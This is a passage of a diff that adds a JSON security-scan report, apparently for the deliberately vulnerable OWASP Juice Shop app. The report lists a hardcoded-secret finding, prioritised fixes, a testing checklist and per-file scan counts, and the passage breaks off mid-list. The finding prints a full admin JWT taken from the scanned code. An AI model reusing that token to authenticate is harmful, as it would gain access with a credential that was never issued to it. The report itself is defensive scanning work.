+      "code": "req.cookies.token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmcifSwiaWF0IjoxNTgyMjIyMzY0fQ.CHiFQieZudYlrd1o8Ih-Izv7XY_WZupt8Our-CP9HqsczyEKqrWC7wWguOgVuSGDN_S3mP4FyuEFN8l60aAhVsUbqzFetvJkFwe5nKVhc9dHuen6cujQLMcTlHLKassOSDP41Q-MkKWcUOQu0xUkTMfEq2hPMHpMosDb4benzH0'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.249080",
+      "category": "Hardcoded Secret"
+    }
+  ],
+  "prioritized_actions": [
+    "[Fix now] SQL Injection: Use parameterized queries or prepared statements.",
+    "[Fix now] XSS: Escape output or use safe DOM methods.",
+    "[Fix now] Command Injection: Avoid passing raw user input to system calls.",
+    "[Fix soon] Hardcoded Secret: Move secrets to environment variables.",
+    "[Fix soon] CSRF: Use anti-CSRF tokens and validate them on every state-changing request."
+  ],
+  "testing_checklist": [
+    "Validate all user-controlled input boundaries and allowed formats.",
+    "Run negative tests for SQLi/XSS/command-injection payloads.",
+    "Verify authN/authZ checks for privileged and sensitive routes.",
+    "Scan dependencies and update vulnerable packages with known fixes.",
+    "Re-test high-priority issues after remediation before release."
+  ],
+  "debug": {
+    "files_scanned": 894,
+    "files_with_matches": 23,
+    "file_details": [
+      {
+        "file": ".codeclimate.yml",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": ".devcontainer.json",
+        "matches": 0,
+        "lines_scanned": 14
+      },
+      {
+        "file": ".eslintrc.js",
+        "matches": 0,
+        "lines_scanned": 49
+      },
+      {
+        "file": ".gitlab-ci.yml",
+        "matches": 0,
+        "lines_scanned": 7
+      },
+      {
+        "file": ".gitpod.yml",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "app.json",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "app.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "config.schema.yml",
+        "matches": 0,
+        "lines_scanned": 754
+      },
+      {
+        "file": "crowdin.yaml",
+        "matches": 0,
+        "lines_scanned": 8
+      },
+      {
+        "file": "cypress.config.ts",
+        "matches": 0,
+        "lines_scanned": 89
+      },
+      {
+        "file": "docker-compose.test.yml",
+        "matches": 0,
+        "lines_scanned": 8
+      },
+      {
+        "file": "Dockerfile",
+        "matches": 0,
+        "lines_scanned": 42
+      },
+      {
+        "file": "Gruntfile.js",
+        "matches": 0,
+        "lines_scanned": 90
+      },
+      {
+        "file": "package.json",
+        "matches": 0,
+        "lines_scanned": 283
+      },
+      {
+        "file": "server.ts",
+        "matches": 0,
+        "lines_scanned": 760
+      },
+      {
+        "file": "swagger.yml",
+        "matches": 0,
+        "lines_scanned": 52
+      },
+      {
+        "file": "threat-model.json",
+        "matches": 0,
+        "lines_scanned": 1070
+      },
+      {
+        "file": "tsconfig.json",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": ".dependabot/config.yml",
+        "matches": 0,
+        "lines_scanned": 31
+      },
+      {
+        "file": ".github/FUNDING.yml",
+        "matches": 0,
+        "lines_scanned": 2
+      },
+      {
+        "file": ".github/ISSUE_TEMPLATE/config.yml",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": ".github/workflows/ci.yml",
+        "matches": 0,
+        "lines_scanned": 358
+      },
+      {
+        "file": ".github/workflows/codeql-analysis.yml",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": ".github/workflows/frontend-bundle-analysis.yml",
+        "matches": 0,
+        "lines_scanned": 67
+      },
+      {
+        "file": ".github/workflows/lint-fixer.yml",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": ".github/workflows/lock.yml",
+        "matches": 0,
+        "lines_scanned": 22
+      },
+      {
+        "file": ".github/workflows/pr-compliance.yml",
+        "matches": 0,
+        "lines_scanned": 472
+      },
+      {
+        "file": ".github/workflows/rebase.yml",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": ".github/workflows/release.yml",
+        "matches": 0,
+        "lines_scanned": 95
+      },
+      {
+        "file": ".github/workflows/stale.yml",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": ".github/workflows/update-challenges-ebook.yml",
+        "matches": 0,
+        "lines_scanned": 35
+      },
+      {
+        "file": ".github/workflows/update-challenges-www-legacy.yml",
+        "matches": 0,
+        "lines_scanned": 55
+      },
+      {
+        "file": ".github/workflows/update-challenges-www.yml",
+        "matches": 0,
+        "lines_scanned": 55
+      },
+      {
+        "file": ".github/workflows/update-news-www-legacy.yml",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": ".github/workflows/update-news-www.yml",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": ".github/workflows/zap_scan.yml",
+        "matches": 0,
+        "lines_scanned": 23
+      },
+      {
+        "file": ".gitlab/auto-deploy-values.yaml",
+        "matches": 0,
+        "lines_scanned": 3
+      },
+      {
+        "file": ".well-known/csaf/provider-metadata.json",
+        "matches": 0,
+        "lines_scanned": 33
+      },
+      {
+        "file": ".well-known/csaf/2017/juice-shop-sa-20200513-express-jwt.json",
+        "matches": 0,
+        "lines_scanned": 121
+      },
+      {
+        "file": ".well-known/csaf/2021/juice-shop-sa-20211014-proto.json",
+        "matches": 0,
+        "lines_scanned": 85
+      },
+      {
+        "file": ".well-known/csaf/2024/juice-shop-sa-disclaimer.json",
+        "matches": 0,
+        "lines_scanned": 141
+      },
+      {
+        "file": "config/7ms.yml",
+        "matches": 0,
+        "lines_scanned": 154
+      },
+      {
+        "file": "config/addo.yml",
+        "matches": 0,
+        "lines_scanned": 123
+      },
+      {
+        "file": "config/bodgeit.yml",
+        "matches": 0,
+        "lines_scanned": 187
+      },
+      {
+        "file": "config/ctf.yml",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "config/default.yml",
+        "matches": 0,
+        "lines_scanned": 466
+      },
+      {
+        "file": "config/defcon33.yml",
+        "matches": 0,
+        "lines_scanned": 166
+      },
+      {
+        "file": "config/fbctf.yml",
+        "matches": 0,
+        "lines_scanned": 349
+      },
+      {
+        "file": "config/juicebox.yml",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "config/mozilla.yml",
+        "matches": 0,
+        "lines_scanned": 187
+      },
+      {
+        "file": "config/oss.yml",
+        "matches": 0,
+        "lines_scanned": 127
+      },
+      {
+        "file": "config/quiet.yml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "config/test.yml",
+        "matches": 0,
+        "lines_scanned": 1
+      },
+      {
+        "file": "config/tutorial.yml",
+        "matches": 0,
+        "lines_scanned": 2
+      },
+      {
+        "file": "config/unsafe.yml",
+        "matches": 0,
+        "lines_scanned": 2
+      },
+      {
+        "file": "data/datacache.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/datacreator.ts",
+        "matches": 0,
+        "lines_scanned": 746
+      },
+      {
+        "file": "data/mongodb.ts",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "data/staticData.ts",
+        "matches": 0,
+        "lines_scanned": 95
+      },
+      {
+        "file": "data/types.ts",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "data/static/botDefaultTrainingData.json",
+        "matches": 0,
+        "lines_scanned": 235
+      },
+      {
+        "file": "data/static/challenges.yml",
+        "matches": 0,
+        "lines_scanned": 1546
+      },
+      {
+        "file": "data/static/contractABIs.ts",
+        "matches": 0,
+        "lines_scanned": 569
+      },
+      {
+        "file": "data/static/deliveries.yml",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "data/static/locales.json",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "data/static/securityQuestions.yml",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "data/static/users.yml",
+        "matches": 0,
+        "lines_scanned": 274
+      },
+      {
+        "file": "data/static/codefixes/accessLogDisclosureChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 14
+      },
+      {
+        "file": "data/static/codefixes/accessLogDisclosureChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "data/static/codefixes/accessLogDisclosureChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 21
+      },
+      {
+        "file": "data/static/codefixes/accessLogDisclosureChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "data/static/codefixes/accessLogDisclosureChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "data/static/codefixes/adminSectionChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "data/static/codefixes/adminSectionChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 194
+      },
+      {
+        "file": "data/static/codefixes/adminSectionChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 191
+      },
+      {
+        "file": "data/static/codefixes/adminSectionChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 191
+      },
+      {
+        "file": "data/static/codefixes/adminSectionChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 191
+      },
+      {
+        "file": "data/static/codefixes/changeProductChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/changeProductChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 78
+      },
+      {
+        "file": "data/static/codefixes/changeProductChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 75
+      },
+      {
+        "file": "data/static/codefixes/changeProductChallenge_3_correct.ts",
+        "matches": 0,
+        "lines_scanned": 79
+      },
+      {
+        "file": "data/static/codefixes/changeProductChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 79
+      },
+      {
+        "file": "data/static/codefixes/dbSchemaChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "data/static/codefixes/dbSchemaChallenge_1.ts",
+        "matches": 1,
+        "lines_scanned": 17
+      },
+      {
+        "file": "data/static/codefixes/dbSchemaChallenge_2_correct.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/dbSchemaChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 23
+      },
+      {
+        "file": "data/static/codefixes/directoryListingChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/directoryListingChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 16
+      },
+      {
+        "file": "data/static/codefixes/directoryListingChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "data/static/codefixes/directoryListingChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/directoryListingChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 21
+      },
+      {
+        "file": "data/static/codefixes/exposedMetricsChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "data/static/codefixes/exposedMetricsChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 39
+      },
+      {
+        "file": "data/static/codefixes/exposedMetricsChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 35
+      },
+      {
+        "file": "data/static/codefixes/exposedMetricsChallenge_3_correct.ts",
+        "matches": 0,
+        "lines_scanned": 39
+      },
+      {
+        "file": "data/static/codefixes/forgedReviewChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "data/static/codefixes/forgedReviewChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "data/static/codefixes/forgedReviewChallenge_2_correct.ts",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "data/static/codefixes/forgedReviewChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 14
+      },
+      {
+        "file": "data/static/codefixes/localXssChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/localXssChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/localXssChallenge_2_correct.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/localXssChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/localXssChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/loginAdminChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/loginAdminChallenge_1.ts",
+        "matches": 1,
+        "lines_scanned": 39
+      },
+      {
+        "file": "data/static/codefixes/loginAdminChallenge_2.ts",
+        "matches": 1,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/loginAdminChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/loginAdminChallenge_4_correct.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/loginBenderChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/loginBenderChallenge_1.ts",
+        "matches": 1,
+        "lines_scanned": 39
+      },
+      {
+        "file": "data/static/codefixes/loginBenderChallenge_2_correct.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/loginBenderChallenge_3.ts",
+        "matches": 1,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/loginBenderChallenge_4.ts",
+        "matches": 1,
+        "lines_scanned": 36
+      },
+      {
+        "file": "data/static/codefixes/loginJimChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/loginJimChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/loginJimChallenge_2.ts",
+        "matches": 1,
+        "lines_scanned": 36
+      },
+      {
+        "file": "data/static/codefixes/loginJimChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/loginJimChallenge_4.ts",
+        "matches": 1,
+        "lines_scanned": 39
+      },
+      {
+        "file": "data/static/codefixes/nftMintChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "data/static/codefixes/nftUnlockChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/noSqlReviewsChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "data/static/codefixes/noSqlReviewsChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "data/static/codefixes/noSqlReviewsChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 14
+      },
+      {
+        "file": "data/static/codefixes/noSqlReviewsChallenge_3_correct.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "data/static/codefixes/redirectChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/redirectChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "data/static/codefixes/redirectChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "data/static/codefixes/redirectChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 31
+      },
+      {
+        "file": "data/static/codefixes/redirectChallenge_4_correct.ts",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "data/static/codefixes/redirectCryptoCurrencyChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/redirectCryptoCurrencyChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "data/static/codefixes/redirectCryptoCurrencyChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "data/static/codefixes/redirectCryptoCurrencyChallenge_3_correct.ts",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "data/static/codefixes/redirectCryptoCurrencyChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "data/static/codefixes/registerAdminChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/registerAdminChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 38
+      },
+      {
+        "file": "data/static/codefixes/registerAdminChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "data/static/codefixes/registerAdminChallenge_3_correct.ts",
+        "matches": 0,
+        "lines_scanned": 38
+      },
+      {
+        "file": "data/static/codefixes/registerAdminChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBenderChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBenderChallenge_1.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBenderChallenge_2_correct.yml",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBenderChallenge_3.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernChallenge_1_correct.yml",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernChallenge_2.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernChallenge_3.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernOwaspChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernOwaspChallenge_1.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernOwaspChallenge_2_correct.yml",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordBjoernOwaspChallenge_3.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordJimChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordJimChallenge_1.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordJimChallenge_2.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordJimChallenge_3_correct.yml",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordMortyChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordMortyChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 6
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordMortyChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 7
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordMortyChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 7
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordMortyChallenge_4_correct.ts",
+        "matches": 0,
+        "lines_scanned": 6
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordUvoginChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordUvoginChallenge_1.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordUvoginChallenge_2.yml",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/resetPasswordUvoginChallenge_3_correct.yml",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": "data/static/codefixes/restfulXssChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "data/static/codefixes/restfulXssChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 56
+      },
+      {
+        "file": "data/static/codefixes/restfulXssChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 63
+      },
+      {
+        "file": "data/static/codefixes/restfulXssChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 50
+      },
+      {
+        "file": "data/static/codefixes/restfulXssChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 63
+      },
+      {
+        "file": "data/static/codefixes/scoreBoardChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "data/static/codefixes/scoreBoardChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 191
+      },
+      {
+        "file": "data/static/codefixes/scoreBoardChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 191
+      },
+      {
+        "file": "data/static/codefixes/scoreBoardChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 187
+      },
+      {
+        "file": "data/static/codefixes/tokenSaleChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "data/static/codefixes/tokenSaleChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 62
+      },
+      {
+        "file": "data/static/codefixes/tokenSaleChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 63
+      },
+      {
+        "file": "data/static/codefixes/tokenSaleChallenge_3_correct.ts",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "data/static/codefixes/unionSqlInjectionChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "data/static/codefixes/unionSqlInjectionChallenge_1.ts",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "data/static/codefixes/unionSqlInjectionChallenge_2_correct.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/unionSqlInjectionChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 22
+      },
+      {
+        "file": "data/static/codefixes/weakPasswordChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "data/static/codefixes/weakPasswordChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "data/static/codefixes/weakPasswordChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/weakPasswordChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "data/static/codefixes/weakPasswordChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 8
+      },
+      {
+        "file": "data/static/codefixes/web3SandboxChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "data/static/codefixes/web3SandboxChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 187
+      },
+      {
+        "file": "data/static/codefixes/web3SandboxChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 192
+      },
+      {
+        "file": "data/static/codefixes/web3SandboxChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 192
+      },
+      {
+        "file": "data/static/codefixes/web3WalletChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/xssBonusChallenge.info.yml",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "data/static/codefixes/xssBonusChallenge_1_correct.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/xssBonusChallenge_2.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/xssBonusChallenge_3.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/codefixes/xssBonusChallenge_4.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "data/static/i18n/ar_SA.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/az_AZ.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/bg_BG.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/bn_BD.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/ca_ES.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/cs_CZ.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/da_DK.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/de_CH.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/de_DE.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/el_GR.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/en.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/es_ES.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/et_EE.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/fa_IR.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/fi_FI.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/fr_FR.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/ga_IE.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/he_IL.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/hi_IN.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/hu_HU.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/id_ID.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/it_IT.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/ja_JP.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/ka_GE.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/ko_KR.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/lv_LV.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/my_MM.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/nl_NL.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/no_NO.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/pl_PL.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/pt_BR.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/pt_PT.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/ro_RO.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/ru_RU.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/si_LK.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/sv_SE.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/th_TH.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/tlh_AA.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/tr_TR.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/uk_UA.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/zh_CN.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/zh_HK.json",
+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "data/static/i18n/zh_TW.json",
